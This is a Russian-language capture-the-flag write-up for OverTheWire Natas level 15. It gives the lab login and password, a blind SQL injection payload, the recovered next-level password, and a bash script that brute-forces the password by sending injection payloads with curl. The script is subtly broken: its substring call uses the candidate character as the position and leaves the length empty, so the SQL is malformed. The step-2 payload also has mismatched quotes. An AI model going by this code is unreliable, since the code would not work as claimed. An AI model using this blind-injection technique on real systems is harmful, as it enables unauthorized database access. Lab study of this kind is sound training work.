---
tags:
  - ctf
created: 2026-03-31
---

# `Level [15]` 
> 

## 🔐 Учётные данные
| Параметр | Значение                                   |
| -------- | ------------------------------------------ |
| Host     | http://natas15.natas.labs.overthewire.org/ |
| Port     |                                            |
| Login    | natas15                                    |
| Password | SdqIqBsFcz3yotlNYErZSZwblkm0lrvx           |

## 🎯 Цель уровня
- Скриптом получить пароль сквозь blind sql injection

## 📚 Ключевые команды/Техники
| Команда | Описание |
| ------- | -------- |
|         |          |
|         |          |
|         |          |

## 💡 Пошаговое решение
| Шаг | Действие                                                                                                                                             | Команда/Код                              |
| --- | ---------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| 1   | понять на что сайт отвечает правду или действие                                                                                                      |                                          |
| 2   | с помощью особенностей blind sql injection и ответов сайта, когда он на символ в таблице отвечает правду или нет, узнать как он реагирует на символы | " OR substring(password,1,1) = "K" -- "' |
| 3   | Написать скрипт для брутфорса пароля подобным методом                                                                                                |                                          |

## 🔍 Результат
Флаг/Пароль: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

## 🚪 Переход
-> [Level_15]

## 🔗 Ссылки
- [Название ресурса](URL)
## 🔗 Скрипт

#!/bin/bash

exist_password=""

for position in {1..32}
do
    for symbol in {a..z} {A..Z} {0..9}
    do
        if curl -u "natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx" \
        -d "username=natas16\" AND BINARY substring(password,$symbol,) = \"${exist_password}${symbol}\" -- " \
        http://natas15.natas.labs.overthewire.org/index.php 2>/dev/null | grep -q "This user exists."; then
            
            exist_password="${exist_password}${symbol}"
            echo "Found: $symbol at position $position"
            echo "Current password: $exist_password"
            break
        fi
    done
done

echo "Final password: $exist_password"